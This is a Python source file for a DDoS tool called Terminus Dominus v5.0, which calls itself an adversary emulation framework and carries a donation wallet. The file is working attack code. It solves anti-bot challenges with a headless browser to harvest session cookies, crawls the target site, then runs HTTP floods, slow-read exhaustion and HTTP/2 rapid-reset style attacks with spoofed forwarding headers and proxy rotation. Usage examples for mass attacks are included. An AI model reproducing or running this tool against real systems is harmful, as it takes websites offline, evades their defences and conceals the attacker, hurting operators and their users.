# =====================================================================================
# TERMINUS DOMINUS v5.0 - DOMINUS EDITION
#
# To forge an unbreakable shield, one must master the art of the unstoppable spear.
# For true security is born from understanding absolute destruction.
#
# --- A Message from the Developer ---
# This framework is the result of months of dedicated research and development,
# offered to the security community for free. If you find Terminus Dominus
# valuable for your research, professional work, or educational purposes,
# please consider supporting its future development.
#
# Your contribution, no matter the size, fuels the evolution of this tool and
# ensures it remains at the cutting edge.
#
# TON: UQBlAOUM1NLDbupA5FEIw1GZakBos_gXbl7XBYLoqrV5Ewe
#
# Thank you for being a part of this mission.
# =====================================================================================
import asyncio
import httpx
import random
import time
import argparse
import sys
import json
import string
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
from rich.console import Console
from rich.table import Table
from rich.live import Live
from rich.panel import Panel
from rich.align import Align
from rich.spinner import Spinner
from rich.text import Text
from playwright.async_api import async_playwright




c2_console = Console()

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
]
COMMON_REFERERS = [
    "https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/", "https://t.co/",
    "https://www.facebook.com/", "https://www.twitter.com/", "https://www.instagram.com/", "https://www.linkedin.com/"
]
def generate_random_string(length=12):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
def get_hyper_realistic_headers(user_agent_override=None):
    ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
    headers = {
        'User-Agent': user_agent_override or random.choice(USER_AGENTS),
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        'Accept-Language': "en-US,en;q=0.9,fa;q=0.8",
        'Accept-Encoding': "gzip, deflate, br, zstd",
        'Connection': "keep-alive",
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0, no-cache',
        'Pragma': 'no-cache',
        'Referer': random.choice(COMMON_REFERERS),
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
        random.choice(['X-Forwarded-For', 'X-Real-IP', 'Forwarded']): ip
    }
    return headers

def generate_complex_payload():
    return json.dumps({
        "sessionId": generate_random_string(32), "timestamp": time.time(),
        "event": random.choice(["user_interaction", "data_fetch", "auth_attempt", "heartbeat"]),
        "payload": {
            "metadata": {"correlationId": generate_random_string(24), "source": random.choice(["web", "mobile", "api"])},
            "data": {generate_random_string(8): generate_random_string(16) for _ in range(random.randint(3, 7))}
        }
    })

class AttackStats:
    """Centralized class for battlefield intelligence."""
    def __init__(self):
        self.requests_sent = 0
        self.requests_success = 0
        self.requests_client_fail = 0
        self.requests_server_fail = 0
        self.requests_other_fail = 0
        self.bytes_sent = 0
        self.start_time = time.time()
        self.latencies = []
        self.server_signature = "Identifying..."
        self.discovered_endpoints = 1
        self.perimeter_breached = "PENDING"
        self.breach_method = "N/A"

    def log_request(self, status_code, bytes_sent, latency):
        self.requests_sent += 1
        self.bytes_sent += bytes_sent
        self.latencies.append(latency)
        if 200 <= status_code < 300: self.requests_success += 1
        elif 400 <= status_code < 500: self.requests_client_fail += 1
        elif 500 <= status_code < 600: self.requests_server_fail += 1
        else: self.requests_other_fail += 1

    def get_avg_latency(self):
        return (sum(self.latencies) / len(self.latencies)) * 1000 if self.latencies else 0

    def generate_c2_table(self):
        elapsed_time = time.time() - self.start_time
        rps = self.requests_sent / elapsed_time if elapsed_time > 0 else 0
        
        breach_style = "bold green" if self.perimeter_breached == "SUCCESSFUL" else "bold yellow" if self.perimeter_breached == "PENDING" else "bold red"
        table = Table(title="[bold red]TERMINUS DOMINUS C2 - LIVE BATTLEFIELD REPORT[/bold red]", show_header=True, header_style="bold magenta", border_style="red")
        table.add_column("Tactical Metric", style="cyan", width=30)
        table.add_column("Value", style="bold green")

        table.add_row("Perimeter Breach Status", f"[{breach_style}]{self.perimeter_breached}[/{breach_style}] (Method: {self.breach_method})")
        table.add_row("Target Server Signature", f"[yellow]{self.server_signature}[/yellow]")
        table.add_row("Mapped Attack Vectors", f"[yellow]{self.discovered_endpoints:,}[/yellow]")
        table.add_row("-" * 25, "-" * 25)
        table.add_row("Operation Time", f"{elapsed_time:.2f} s")
        table.add_row("Total Payloads Deployed", f"{self.requests_sent:,}")
        table.add_row("Deployment Rate (RPS)", f"{rps:.2f}")
        table.add_row("Data Transmitted", f"{self.bytes_sent / 1024 / 1024:.2f} MB")
        table.add_row("Avg. Target Response Time", f"{self.get_avg_latency():.2f} ms")
        table.add_row("-" * 25, "-" * 25)
        table.add_row("[green]Payloads Acknowledged (2xx)", f"{self.requests_success:,}")
        table.add_row("[yellow]Target Defenses Active (4xx)", f"{self.requests_client_fail:,}")
        table.add_row("[orange_red1]Target Under Duress (5xx)", f"[orange_red1]{self.requests_server_fail:,}")
        table.add_row("[bright_red]Connection Severed", f"[bright_red]{self.requests_other_fail:,}")
        
        return table
class ChallengeBypassModule:
    """Uses a real browser to solve JS/CAPTCHA challenges and harvest session credentials."""
    async def breach_perimeter(self, target_url, headless=True):
        c2_console.print(Panel("[yellow]Engaging Anti-WAF countermeasures... Launching headless browser to solve JS challenge.[/yellow]", title="[bold red]PHASE 1: PERIMETER BREACH[/bold red]"))
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=headless)
                context = await browser.new_context()
                page = await context.new_page()
                
                spinner = Spinner("bouncingBar", text=Text("Navigating to target and awaiting challenge resolution...", style="cyan"))
                with Live(spinner, console=c2_console, transient=True):
                    await page.goto(target_url, wait_until="domcontentloaded", timeout=60000)
                    # Wait for network to be idle, a strong indicator that JS challenges are resolved.
                    await page.wait_for_load_state('networkidle', timeout=90000)

                cookies = await context.cookies()
                user_agent = await page.evaluate("() => navigator.userAgent")
                
                await browser.close()

                if not cookies:
                    c2_console.print("[bold red]Perimeter Breach FAILED. No cookies harvested. The target's defenses are formidable. Aborting.[/bold red]")
                    return None, None

                c2_console.print(f"[bold green]Perimeter Breach SUCCESSFUL. {len(cookies)} session cookies harvested. User-Agent profile locked.[/bold green]")
                return {c['name']: c['value'] for c in cookies}, user_agent
        except Exception as e:
            c2_console.print(f"[bold red]CATASTROPHIC BREACH FAILURE: {e}. The operation cannot proceed.[/bold red]")
            return None, None
class ReconModule:
    """Recursively crawls the target to map the entire attack surface."""
    def __init__(self, base_url, session_cookies, user_agent, max_depth=3):
        self.base_url = base_url
        self.base_domain = urlparse(base_url).netloc
        self.session_cookies = session_cookies
        self.user_agent = user_agent
        self.max_depth = max_depth
        self.discovered_urls = set()
        self.visited_urls = set()

    async def map_attack_surface(self):
        c2_console.print(Panel("[yellow]Initiating deep reconnaissance scan... Mapping all attack vectors.[/yellow]", title="[bold red]PHASE 2: BATTLEFIELD MAPPING[/bold red]"))
        queue = asyncio.Queue()
        await queue.put((self.base_url, 0))
        self.discovered_urls.add(self.base_url)
        
        headers = get_hyper_realistic_headers(self.user_agent)

        async with httpx.AsyncClient(http2=True, verify=False, cookies=self.session_cookies, headers=headers, timeout=10) as client:
            while not queue.empty():
                current_url, depth = await queue.get()
                
                if current_url in self.visited_urls or depth >= self.max_depth:
                    continue
                self.visited_urls.add(current_url)
                try:
                    response = await client.get(current_url)
                    soup = BeautifulSoup(response.text, 'lxml')
                    
                    for link in soup.find_all('a', href=True):
                        href = link['href']
                        full_url = urljoin(current_url, href)
                        
                        if urlparse(full_url).netloc == self.base_domain and full_url not in self.discovered_urls:
                            self.discovered_urls.add(full_url)
                            await queue.put((full_url, depth + 1))
                except (httpx.RequestError, httpx.TimeoutException):
                    pass
        
        c2_console.print(f"[bold green]Reconnaissance Complete. {len(self.discovered_urls)} potential targets identified and locked.[/bold green]")
        return list(self.discovered_urls)



# please Donate. (:



class TerminusDominus:
    def __init__(self, target, concurrency, method, proxy_file=None, headless_bypass=True, recon_depth=2):
        self.base_target = target
        self.target_domain = urlparse(target).netloc
        self.concurrency = concurrency
        self.method_name = method
        self.stats = AttackStats()
        self.proxies = self._load_proxies(proxy_file)
        self.headless_bypass = headless_bypass
        self.recon_depth = recon_depth
        
        self.session_cookies = None
        self.session_user_agent = None
        self.attack_vectors = {self.base_target}

        self.warheads = {
            'flood': self._warhead_http_flood,
            'slow_read': self._warhead_slow_read,
            'stream_exhaust': self._warhead_http2_stream_exhaustion,
        }
        self.strategies = {
            'flood': self._strategy_focused_assault,
            'slow_read': self._strategy_focused_assault,
            'stream_exhaust': self._strategy_focused_assault,
            'dynamic_breach': self._strategy_dynamic_annihilation,
            'recon_and_destroy': self._strategy_dynamic_annihilation,
        }
        self.assault_strategy = self.strategies[method]

    def _load_proxies(self, proxy_file):
        if not proxy_file: return None
        try:
            with open(proxy_file, 'r') as f:
                proxies = [line.strip() for line in f if line.strip()]
            if not proxies: return None
            c2_console.print(f"[cyan]Anonymity Matrix Engaged: {len(proxies)} proxies loaded.[/cyan]")
            return proxies
        except FileNotFoundError:
            c2_console.print(f"[bold red]FATAL: Proxy file {proxy_file} not found. Aborting.[/bold red]")
            sys.exit(1)

    def _get_proxy(self):
        return {'all://': random.choice(self.proxies)} if self.proxies else None

    def _get_random_target(self):
        return random.choice(list(self.attack_vectors))

    # --- WARHEADS (Individual Attack Payloads) ---
    async def _warhead_http_flood(self, client, target):
        headers = get_hyper_realistic_headers(self.session_user_agent)
        try:
            if random.random() < 0.7:  # 70% GET, 30% POST
                url_with_param = f"{target}?{generate_random_string()}={generate_random_string(20)}"
                start_req, bytes_sent = time.time(), len(url_with_param.encode())
                resp = await client.get(url_with_param, headers=headers, timeout=10)
                self.stats.log_request(resp.status_code, bytes_sent, time.time() - start_req)
            else:
                payload = generate_complex_payload()
                start_req, bytes_sent = time.time(), len(target.encode()) + len(payload.encode())
                resp = await client.post(target, headers=headers, data=payload, timeout=10)
                self.stats.log_request(resp.status_code, bytes_sent, time.time() - start_req)
        except httpx.RequestError: self.stats.log_request(0, 0, 0)

    async def _warhead_slow_read(self, client, target):
        headers = get_hyper_realistic_headers(self.session_user_agent)
        try:
            start_req = time.time()
            async with client.stream("GET", target, headers=headers, timeout=60) as response:
                self.stats.log_request(response.status_code, 0, time.time() - start_req)
                async for _ in response.aiter_bytes(chunk_size=1):
                    await asyncio.sleep(random.uniform(2, 5))
        except httpx.RequestError: self.stats.log_request(0, 0, 0)

    async def _warhead_http2_stream_exhaustion(self, client, target):
        """Simulates HTTP/2 Rapid Reset by opening many streams and immediately cancelling them."""
        headers = get_hyper_realistic_headers(self.session_user_agent)
        try:
            start_req = time.time()
            async with asyncio.timeout(0.1): # Agressively short timeout to cancel the request
                await client.get(target, headers=headers)
            # This request is "successful" from our end, as it forced the server to open a stream.
            self.stats.log_request(202, 0, time.time() - start_req) # 202 Accepted
        except asyncio.TimeoutError:
            self.stats.log_request(202, 0, time.time() - start_req)
        except httpx.RequestError:
            self.stats.log_request(0, 0, 0)
        await asyncio.sleep(0.01) # Rapid fire

    # --- ASSAULT STRATEGIES ---
    async def _strategy_focused_assault(self, client):
        """Executes a single, specified warhead continuously."""
        warhead = self.warheads[self.method_name]
        while True:
            await warhead(client, self._get_random_target())
            await asyncio.sleep(0.01)

    async def _strategy_dynamic_annihilation(self, client):
        """Intelligently switches between all available warheads against all discovered targets."""
        active_warheads = list(self.warheads.values())
        while True:
            target = self._get_random_target()
            chosen_warhead = random.choice(active_warheads)
            await chosen_warhead(client, target)
            await asyncio.sleep(random.uniform(0.01, 0.2))

    # --- CORE EXECUTION FLOW ---
    async def _cyber_legionnaire_task(self):
        """A single attacker unit. It lives and dies by its mission."""
        proxy = self._get_proxy()
        async with httpx.AsyncClient(http2=True, verify=False, proxies=proxy, cookies=self.session_cookies) as client:
            await self.assault_strategy(client)

    async def launch_war(self):
        """The main battlefield command function."""
        # PHASE 1: PERIMETER BREACH
        bypass_module = ChallengeBypassModule()
        self.session_cookies, self.session_user_agent = await bypass_module.breach_perimeter(self.base_target, self.headless_bypass)
        if not self.session_cookies:
            return # Abort
        self.stats.perimeter_breached = "SUCCESSFUL"
        self.stats.breach_method = "Playwright"
        
        # PHASE 2: RECONNAISSANCE
        if self.method_name in ['recon_and_destroy', 'dynamic_breach']:
            recon_module = ReconModule(self.base_target, self.session_cookies, self.session_user_agent, self.recon_depth)
            self.attack_vectors = await recon_module.map_attack_surface()
            self.stats.discovered_endpoints = len(self.attack_vectors)
        
        # Initial server signature grab
        try:
            async with httpx.AsyncClient(cookies=self.session_cookies, verify=False) as client:
                resp = await client.head(self.base_target, timeout=10)
                self.stats.server_signature = resp.headers.get('Server', 'Unknown/Stealthed')
        except Exception: pass
        
        # PHASE 3: ANNIHILATION
        with Live(self.stats.generate_c2_table(), screen=True, vertical_overflow="visible", auto_refresh=False) as live:
            async def update_display():
                while True:
                    live.update(self.stats.generate_c2_table(), refresh=True)
                    await asyncio.sleep(0.5)

            update_task = asyncio.create_task(update_display())
            
            c2_console.print(Panel(
                f"[bold green]Executing '{self.method_name.upper()}' strategy against [cyan]{self.target_domain}[/cyan][/bold green]\n"
                f"[bold]Cyber Legionnaires Deployed: [cyan]{self.concurrency}[/cyan][/bold]\n"
                f"[bold]Anonymity Matrix: [{'magenta' if self.proxies else 'yellow'}]Status {'ACTIVE' if self.proxies else 'INACTIVE'}[/{'magenta' if self.proxies else 'yellow'}]",
                title="[bold red]PHASE 3: BATTLEFIELD ENGAGEMENT PROTOCOL[/bold red]"
            ))
            c2_console.print("[yellow]Press Ctrl+C for emergency operation abort.[/yellow]")

            tasks = [self._cyber_legionnaire_task() for _ in range(self.concurrency)]
            await asyncio.gather(*tasks)

async def main():
    parser = argparse.ArgumentParser(
        description="Terminus Dominus v5.0 - Dominus Edition. An advanced adversary emulation framework.",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""
STRATEGIES:
  [Core Assaults]
  flood:            Classic high-volume HTTP request flood (GET/POST).
  slow_read:        Exhausts connection pools by reading server responses extremely slowly.
  stream_exhaust:   Simulates HTTP/2 Rapid Reset to cripple modern servers by exhausting stream IDs.
  
  [Hunter-Killer Strategies]
  dynamic_breach:   Breaches perimeter, then uses a dynamic mix of all warheads against the single base target.
  recon_and_destroy: The ultimate weapon. Breaches, maps the ENTIRE site, then unleashes all warheads against ALL discovered targets.

USAGE EXAMPLES:
  # THE ULTIMATE ATTACK: Breach, recon, and destroy an entire site with 250 legionnaires using proxies.
  python terminus_dominus.py https://example.com -c 250 -m recon_and_destroy -p proxies.txt

  # Focused HTTP/2 exhaustion attack against a specific API endpoint after solving the main site's challenge.
  python terminus_dominus.py https://api.example.com/v1/data -c 150 -m stream_exhaust

  # See the challenge bypass in action (non-headless mode).
  python terminus_dominus.py https://example.com -c 50 -m dynamic_breach --visible-bypass
"""
    )
    parser.add_argument("url", help="The primary target URL for initial perimeter breach.")
    parser.add_argument("-c", "--concurrency", type=int, default=100, help="Number of concurrent attackers (Cyber Legionnaires).")
    parser.add_argument("-m", "--method", choices=['flood', 'slow_read', 'stream_exhaust', 'dynamic_breach', 'recon_and_destroy'], default='dynamic_breach', help="The assault strategy to deploy.")
    parser.add_argument("-p", "--proxies", type=str, default=None, help="Text file of proxies for the anonymity matrix.")
    parser.add_argument("-d", "--depth", type=int, default=2, help="Max depth for the 'recon_and_destroy' crawler.")
    parser.add_argument("--visible-bypass", action="store_false", dest="headless", help="Show the browser window during the challenge bypass phase.")
    
    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)
        
    args = parser.parse_args()

    banner = Panel(
        Align.center(
            "[bold red]TERMINUS DOMINUS v5.0[/bold red]\n[bright_yellow]DOMINUS EDITION[/bright_yellow]",
            vertical="middle"
        ),
        title="[bold]Adversary Emulation & Annihilation Framework[/bold]",
        subtitle="[cyan]...For a More Secure Tomorrow.[/cyan]",
        border_style="red"
    )
    c2_console.print(banner)

    try:
        dominus = TerminusDominus(
            target=args.url,
            concurrency=args.concurrency,
            method=args.method,
            proxy_file=args.proxies,
            headless_bypass=args.headless,
            recon_depth=args.depth
        )
        await dominus.launch_war()
    except KeyboardInterrupt:
        c2_console.print("\n[bold yellow]COMMAND OVERRIDE: Operation manually aborted. Legionnaires disengaging.[/bold yellow]")
    except Exception as e:
        c2_console.print(f"\n[bold red]CATASTROPHIC SYSTEM FAILURE: {e}. Operation terminated with extreme prejudice.[/bold red]")
    finally:
        c2_console.print("[bold cyan]Operation concluded. The hunt is over.[/bold cyan]")

if __name__ == "__main__":
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.run(main())

